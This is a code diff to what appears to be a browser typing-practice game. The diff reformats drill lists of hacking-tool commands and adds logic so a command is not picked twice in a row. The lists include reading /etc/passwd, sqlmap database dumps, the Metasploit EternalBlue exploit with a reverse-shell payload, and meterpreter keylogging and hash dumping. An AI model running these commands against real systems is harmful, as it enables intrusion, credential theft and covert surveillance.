@@ -80,7 +80,6 @@ linux:[
   "whoami","id","pwd","ls -la","cd /var/www/html","cat /etc/passwd",
   "history | tail","ps aux","df -h","du -sh *","chmod +x exploit.sh","sudo -l"
 ],
-
 nmap:[
   "nmap 192.168.1.1","nmap -sS 192.168.1.1","nmap -sV 192.168.1.1",
   "nmap -A 192.168.1.1","nmap -p 22,80,443 192.168.1.1",
@@ -89,7 +88,6 @@ nmap:[
   "nmap --script vuln 192.168.1.1","nmap -T4 -Pn 192.168.1.1",
   "nmap -oN scan.txt 192.168.1.1"
 ],
-
 sqlmap:[
   "sqlmap -u http://site.com/index.php?id=1",
   "sqlmap -u http://site.com/index.php?id=1 --dbs",
@@ -102,49 +100,38 @@ sqlmap:[
   "sqlmap -r request.txt --dbs",
   "sqlmap -r request.txt --dump"
 ],
-
 metasploit:[
-  "msfconsole",
-  "search smb",
+  "msfconsole","search smb",
   "use exploit/windows/smb/ms17_010_eternalblue",
   "show options",
   "set RHOSTS 192.168.1.10",
   "set LHOST 192.168.1.5",
   "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-  "exploit",
-  "sessions",
-  "sessions -i 1"
+  "exploit","sessions","sessions -i 1"
 ],
-
 meterpreter:[
-  "sysinfo",
-  "getuid",
-  "ps",
-  "shell",
-  "pwd",
-  "ls",
-  "cd ..",
-  "upload file.txt",
-  "download secret.txt",
-  "screenshot",
-  "webcam_snap",
-  "keyscan_start",
-  "keyscan_dump",
-  "keyscan_stop",
-  "hashdump",
-  "background"
+  "sysinfo","getuid","ps","shell","pwd","ls","cd ..",
+  "upload file.txt","download secret.txt","screenshot",
+  "keyscan_start","keyscan_dump","keyscan_stop",
+  "hashdump","background"
 ]
 };
 
-/* ===== CORE LOGIC (locked) ===== */
+/* ===== CORE LOGIC ===== */
 let target="", typed="";
 let done=0, total=15, errors=0;
 let locked=false;
+let lastCommand="";
 
 function pickCommand(){
   const tool=document.getElementById("tool").value;
   const list=commands[tool];
-  return list[Math.floor(Math.random()*list.length)];
+  let cmd;
+  do {
+    cmd = list[Math.floor(Math.random()*list.length)];
+  } while (cmd === lastCommand && list.length > 1);
+  lastCommand = cmd;
+  return cmd;
 }
 
 function render(){
